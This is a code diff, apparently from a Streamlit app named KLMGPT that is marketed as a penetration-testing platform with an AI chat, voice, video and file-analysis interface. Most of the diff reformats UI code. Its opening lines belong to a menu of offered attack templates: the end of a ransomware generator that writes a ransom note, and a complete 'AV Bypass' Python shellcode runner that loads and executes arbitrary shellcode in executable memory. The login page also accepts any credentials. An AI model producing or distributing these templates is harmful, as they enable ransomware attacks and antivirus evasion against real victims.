+with open('/home/RANSOM_NOTE.txt', 'w') as f: f.write(note)
+print("[+] Ransomware complete.")""", language="python")
             
             elif tool == "AV Bypass":
                 if st.button("Generate AV Bypass Template", key="av_btn"):
-                    st.code(
-                        """# Shellcode Runner with AV Evasion
-import ctypes, base64, sys
+                    st.code("""import ctypes, base64, sys
 
 shellcode_b64 = "YOUR_BASE64_SHELLCODE_HERE"
 shellcode = base64.b64decode(shellcode_b64)
 
 ptr = ctypes.windll.kernel32.VirtualAlloc(
     ctypes.c_int(0), ctypes.c_int(len(shellcode)),
-    ctypes.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
-    ctypes.c_int(0x40))     # PAGE_EXECUTE_READWRITE
+    ctypes.c_int(0x3000), ctypes.c_int(0x40))
 
 ctypes.windll.kernel32.RtlMoveMemory(
     ctypes.c_int(ptr), shellcode, ctypes.c_int(len(shellcode)))
@@ -1099,9 +901,7 @@ ctypes.windll.kernel32.CreateThread(
     ctypes.c_int(0), ctypes.c_int(0),
     ctypes.c_int(ptr), ctypes.c_int(0),
     ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
-ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(-1), ctypes.c_int(-1))""",
-                        language="python",
-                    )
+ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(-1), ctypes.c_int(-1))""", language="python")
     
     # ============================================================
     # TAB 2 - VOICE
@@ -1128,7 +928,7 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(-1), ctypes.c_int(-1))""
                     st.success(f"You said: {text}")
                     st.session_state.chat_history.append({"role": "user", "content": text})
                     
-                    with st.spinner(f"Thinking... ({current_api_model})"):
+                    with st.spinner("Thinking..."):
                         resp = call_ai(text)
                     
                     st.markdown(f"**KLMGPT:** {resp}")
@@ -1143,26 +943,19 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(-1), ctypes.c_int(-1))""
                                 st.audio(f.read(), format="audio/mp3")
                             os.unlink(audio_file)
                 else:
-                    st.error("Could not recognize speech. Try speaking clearly.")
+                    st.error("Could not recognize speech.")
     
     # ============================================================
     # TAB 3 - SCREEN SHARE
     # ============================================================
     with tabs[2]:
         st.markdown("### Screen Share")
-        
-        RTC_CONFIG = RTCConfiguration(
-            {"iceServers": [{"urls": ["stun:stun.l.google.com:19302"]}]}
-        )
-        
+        RTC_CONFIG = RTCConfiguration({"iceServers": [{"urls": ["stun:stun.l.google.com:19302"]}]})
         webrtc_streamer(
             key="screen-share",
             mode=WebRtcMode.SENDONLY,
             rtc_configuration=RTC_CONFIG,
-            media_stream_constraints={
-                "video": {"width": {"ideal": 1920}, "height": {"ideal": 1080}, "frameRate": {"ideal": 30}},
-                "audio": True,
-            },
+            media_stream_constraints={"video": {"width": {"ideal": 1920}, "height": {"ideal": 1080}, "frameRate": {"ideal": 30}}, "audio": True},
             video_processor_factory=VideoProcessor,
             async_processing=True,
         )
@@ -1172,22 +965,15 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(-1), ctypes.c_int(-1))""
     # ============================================================
     with tabs[3]:
         st.markdown("### Live Video")
-        
         col_vid1, col_vid2 = st.columns([2, 1])
         
         with col_vid1:
-            RTC_CONFIG = RTCConfiguration(
-                {"iceServers": [{"urls": ["stun:stun.l.google.com:19302"]}]}
-            )
-            
+            RTC_CONFIG = RTCConfiguration({"iceServers": [{"urls": ["stun:stun.l.google.com:19302"]}]})
             webrtc_streamer(
                 key="video-chat",
                 mode=WebRtcMode.SENDRECV,
                 rtc_configuration=RTC_CONFIG,
-                media_stream_constraints={
-                    "video": {"width": {"ideal": 640}, "height": {"ideal": 480}, "frameRate": {"ideal": 24}},
-                    "audio": True,
-                },
+                media_stream_constraints={"video": {"width": {"ideal": 640}, "height": {"ideal": 480}, "frameRate": {"ideal": 24}}, "audio": True},
                 video_processor_factory=VideoProcessor,
                 async_processing=True,
             )
@@ -1205,12 +991,9 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(-1), ctypes.c_int(-1))""
                     
                     with st.spinner("Analyzing image..."):
                         image = Image.open(io.BytesIO(camera_photo.getvalue()))
-                        resp = call_ai("Describe this image in detail. What do you see?", image=image)
+                        resp = call_ai("Describe this image in detail.", image=image)
                         st.markdown(f"**Analysis:** {resp}")
-                        st.session_state.chat_history.append({
-                            "role": "assistant",
-                            "content": f"[Camera Analysis] {resp}",
-                        })
+                        st.session_state.chat_history.append({"role": "assistant", "content": f"[Camera] {resp}"})
                         increment_chat_count()
     
     # ============================================================
@@ -1218,112 +1001,69 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(-1), ctypes.c_int(-1))""
     # ============================================================
     with tabs[4]:
         st.markdown("### File Upload & Analysis")
-        
         ok, remaining = check_chat_limit()
         if remaining <= 0:
             st.error("Daily chat limit reached (50/day).")
             st.stop()
         
-        uploaded_file = st.file_uploader(
-            "Choose a file",
-            type=[
-                "txt", "py", "js", "html", "css", "json", "xml", "md",
-                "csv", "sh", "bat", "ps1", "yml", "yaml", "conf", "ini",
-                "log", "sql", "php", "rb", "go", "rs", "java", "cpp", "c",
-                "h", "ts", "jsx", "tsx",
-                "png", "jpg", "jpeg", "gif", "bmp", "webp",
-                "pdf", "doc", "docx", "xls", "xlsx",
-            ],
-            help="Max 200MB. Supported: code, images, text, documents.",
-        )
+        uploaded_file = st.file_uploader("Choose a file", type=[
+            "txt", "py", "js", "html", "css", "json", "xml", "md",
+            "csv", "sh", "bat", "ps1", "yml", "yaml", "conf", "ini",
+            "log", "sql", "php", "rb", "go", "rs", "java", "cpp", "c",
+            "h", "ts", "jsx", "tsx",
+            "png", "jpg", "jpeg", "gif", "bmp", "webp",
+        ], help="Max 200MB. Supported: code, images, text.")
         
         if uploaded_file:
             result = process_uploaded_file(uploaded_file)
             
             if result["type"] == "image":
-                st.success(f"Uploaded: {result['name']} (Image - {result['size']/1024:.1f} KB)")
+                st.success(f"Uploaded: {result['name']} ({result['size']/1024:.1f} KB)")
                 st.image(result["data"], caption=result["name"], use_column_width=True)
-                
-                if st.button("Analyze Image with AI", use_container_width=True):
-                    with st.spinner("Analyzing image..."):
-                        resp = call_ai(
-                            f"Analyze this image file ({result['name']}). Describe everything you see in detail.",
-                            image=result["data"],
-                        )
-                    st.markdown(f"### Analysis Result")
+                if st.button("Analyze Image", use_container_width=True):
+                    with st.spinner("Analyzing..."):
+                        resp = call_ai(f"Analyze this image ({result['name']}). Describe in detail.", image=result["data"])
                     st.markdown(f"<div class='chat-message assistant'><b>KLMGPT:</b> {resp}</div>", unsafe_allow_html=True)
-                    st.session_state.chat_history.append({
-                        "role": "assistant",
-                        "content": f"[File Analysis: {result['name']}] {resp}",
-                    })
+                    st.session_state.chat_history.append({"role": "assistant", "content": f"[File: {result['name']}] {resp}"})
                     increment_chat_count()
             
             elif result["type"] == "text":
-                st.success(f"Uploaded: {result['name']} (Text/Code - {result['size']/1024:.1f} KB)")
-                preview = result["data"][:3000]
-                st.text_area("Content Preview", preview, height=200)
+                st.success(f"Uploaded: {result['name']} ({result['size']/1024:.1f} KB)")
+                st.text_area("Preview", result["data"][:3000], height=200)
                 
-                col_ana, col_batch = st.columns([1, 1])
-                with col_ana:
-                    if st.button("Analyze with AI", use_container_width=True):
-                        with st.spinner("Analyzing file..."):
-                            prompt = f"Analyze this file ({result['name']}):\n\n```\n{result['data'][:8000]}\n```\n\nProvide detailed analysis, findings, and recommendations."
-                            resp = call_ai(prompt)
-                        st.markdown(f"### Analysis Result")
-                        st.markdown(f"<div class='chat-message assistant'><b>KLMGPT:</b> {resp}</div>", unsafe_allow_html=True)
-                        st.session_state.chat_history.append({
-                            "role": "assistant",
-                            "content": f"[File Analysis: {result['name']}] {resp}",
-                        })
-                        increment_chat_count()
-                
-                with col_batch:
-                    if st.button("Debug Code", use_container_width=True):
-                        code_exts = [".py", ".js", ".html", ".php", ".rb", ".go", ".java", ".cpp", ".c", ".ts"]
-                        if any(result["name"].endswith(ext) for ext in code_exts):
-                            prompt = f"Debug this {result['name'].split('.')[-1]} code. Find bugs and suggest fixes:\n\n```\n{result['data'][:8000]}\n```"
-                            with st.spinner("Debugging..."):
-                                resp = call_ai(prompt)
-                            st.markdown(f"### Debug Result")
-                            st.markdown(f"<div class='chat-message assistant'><b>KLMGPT:</b> {resp}</div>", unsafe_allow_html=True)
-                            increment_chat_count()
-                        else:
-                            st.info("Debug is available for code files only.")
+                if st.button("Analyze Text", use_container_width=True):
+                    with st.spinner("Analyzing..."):
+                        prompt = f"Analyze this file ({result['name']}):\n```\n{result['data'][:8000]}\n```\nAnalysis?"
+                        resp = call_ai(prompt)
+                    st.markdown(f"<div class='chat-message assistant'><b>KLMGPT:</b> {resp}</div>", unsafe_allow_html=True)
+                    st.session_state.chat_history.append({"role": "assistant", "content": f"[File: {result['name']}] {resp}"})
+                    increment_chat_count()
             
             elif result["type"] == "binary":
                 st.info(f"Binary file: {result['name']} ({result['size']/1024:.1f} KB)")
-            
-            elif result["type"] == "error":
-                st.error(f"Error: {result['data']}")
 
 # ============================================================
 # LOGIN PAGE
 # ============================================================
 def login_page():
     st.markdown(APP_CSS, unsafe_allow_html=True)
-    
-    st.markdown(
-        """
+    st.markdown("""
         <div class="login-box">
             <h1 style="color:#ECECF1;font-size:36px;margin-bottom:8px;">KLMGPT</h1>
             <h3 style="color:#8E8EA0;font-weight:400;margin-bottom:24px;">Penetration Testing Platform</h3>
             <p style="color:#8E8EA0;font-size:14px;margin-bottom:32px;">By Hydra Strozzz</p>
         </div>
-        """,
-        unsafe_allow_html=True,
-    )
+    """, unsafe_allow_html=True)
     
     col1, col2, col3 = st.columns([1, 2, 1])
     with col2:
         email = st.text_input("Email", placeholder="your@email.com")
         password = st.text_input("Password", type="password", placeholder="password")
-        
         if st.button("Sign In", use_container_width=True):
             st.session_state.authenticated = True
             st.session_state.user_email = email or "user@klmgpt"
             st.session_state.login_page = False
             st.rerun()
-        
         st.markdown("<br>", unsafe_allow_html=True)
         if st.button("Continue as Guest", use_container_width=True):
             st.session_state.authenticated = True
